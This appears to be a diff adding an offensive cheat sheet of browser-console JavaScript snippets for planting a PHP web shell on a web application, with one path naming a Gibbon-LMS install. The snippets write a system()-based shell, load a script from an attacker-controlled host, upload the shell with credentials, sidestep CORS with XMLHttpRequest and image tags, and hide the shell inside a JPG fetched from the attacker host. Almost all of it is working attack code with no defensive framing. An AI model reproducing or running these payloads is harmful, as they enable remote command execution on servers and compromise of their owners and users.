@@ -1,0 +1,48 @@
+##Upload Php shell with js from browser console:
+fetch("http://url?cmd=" + encodeURIComponent(
+    `echo "<?php system($_GET['cmd']); ?>" > C:\\xampp\\htdocs\\Gibbon-LMS\\shell.php`
+))
+
+---------------------------------------------------------------------------------------------------------------------------
+##Download files from browser console with js : 
+$.getScript('http://ur-Ip:8000/upload.js');
+
+---------------------------------------------------------------------------------------------------------------------------
+##Some browsers apply stricter CORS rules on fetch() than XMLHttpRequest.
+##Sometimes XMLHttpRequest works when fetch() is blocked.
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://url/", true);
+xhr.withCredentials = true;
+
+var formData = new FormData();
+formData.append("file", new Blob(["<?php system($_GET['cmd']); ?>"], {type: "text/plain"}), "shell.php");
+
+xhr.send(formData);
+
+---------------------------------------------------------------------------------------------------------------------------
+##If CORS only blocks fetch() but not HTML elements, loading shell.php in an image tag:
+##If the response leaks execution output inside an alt tag or logs, you can extract it via CSS or JavaScript.
+let img = document.createElement("img");
+img.src = "http://url/shell.php?cmd=id";
+document.body.appendChild(img);
+
+---------------------------------------------------------------------------------------------------------------------------
+##Create an image with a hidden PHP web shell:
+echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+cat shell.php >> shell.jpg
+
+#Modify the upload script to send it:
+fetch("http://ur-Ip:8000/shell.jpg")
+    .then(res => res.blob())
+    .then(blob => {
+        let formData = new FormData();
+        formData.append("file", blob, "shell.jpg");
+
+        return fetch("http://url/", {
+            method: "POST",
+            body: formData
+        });
+    })
+    .then(res => res.text())
+    .then(output => console.log("Upload Result:", output))
+    .catch(err => console.log("Upload Error:", err));
